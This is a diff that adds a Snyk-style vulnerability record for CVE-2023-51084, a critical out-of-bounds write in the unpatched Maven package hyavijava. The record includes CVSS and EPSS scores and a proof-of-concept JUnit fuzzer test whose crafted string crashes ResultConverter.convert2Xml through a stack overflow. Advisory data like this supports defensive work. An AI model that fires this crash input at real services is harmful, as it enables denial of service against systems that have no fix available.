@@ -1,0 +1,65 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentiality": "HIGH",
+        "integrity": "HIGH",
+        "availability": "HIGH"
+    },
+    "credit": [
+        "PoppingSnack"
+    ],
+    "cvssDetails": [
+        {
+            "assigner": "NVD",
+            "cvssV3BaseScore": 9.8,
+            "cvssV3Vector": {
+                "CVSS": "3.1",
+                "attackVector": "NETWORK",
+                "attackComplexity": "LOW",
+                "privilegesRequired": "NONE",
+                "userInteraction": "NONE",
+                "scope": "UNCHANGED",
+                "confidentiality": "HIGH",
+                "integrity": "HIGH",
+                "availability": "HIGH"
+            },
+            "severity": "critical"
+        }
+    ],
+    "cvssScore": 9.8,
+    "disclosureTime": "2023-12-27 21:31:01",
+    "epssDetails": {
+        "modelVersion": "v2023.03.01",
+        "percentile": "0.23966",
+        "probability": "0.00061"
+    },
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-JAVA-COMGITHUB-6144803",
+    "identifiers": {
+        "CVE": [
+            "CVE-2023-51084"
+        ],
+        "CWE": [
+            "CWE-787"
+        ]
+    },
+    "language": "java",
+    "malicious": false,
+    "packageManager": "maven",
+    "publicationTime": "2024-01-05 13:20:09",
+    "remediation": "There is no fixed version for com.github:hyavijava . ",
+    "severity": "critical",
+    "socialTrendAlert": false,
+    "title": "Out-of-bounds Write",
+    "vulnDescription": {
+        "Overview": "Affected versions of this package are vulnerable to Out-of-bounds Write via the ResultConverter.convert2Xml method. An attacker can execute arbitrary code or cause a denial of service by triggering a stack overflow condition. ",
+        "PoC": "import org.junit.Test; import com.vmware.vim.rest.*; public class ResultConverterFuzzerConvert2Xml { @Test public void convert2XmlFuzzerTest() { try { String result = ResultConverter.convert2Xml(\"\\u0015'\\u0015\\u0015\\u0015\\u0015<<tr>\\u0015<tr><'\\u0015td></ta\\u0015'\\u0015\\u0015td>$</tab</ta\\u0015'\\u0015\\u0015\\u0015\\u0015<<trbl>ler>\\u0015\\u0015\\uF577\\uFFD5<tr><'\\u0015$</tabler>\\u0015\\u0015\\uF577\\u0015\\u0015\\u0015<<tr>\\u0015<t</td></t\\u0015a\\u0015'\\u0015\\u0015\\u0015\\u0015<<trbl>\\u0015<tr><'\\u0015$<</tabler>\\u0015\\u0015\\uF555\\u0015<<t\"); } catch (Exception e) { } } } "
+    },
+    "source_code": []
+}
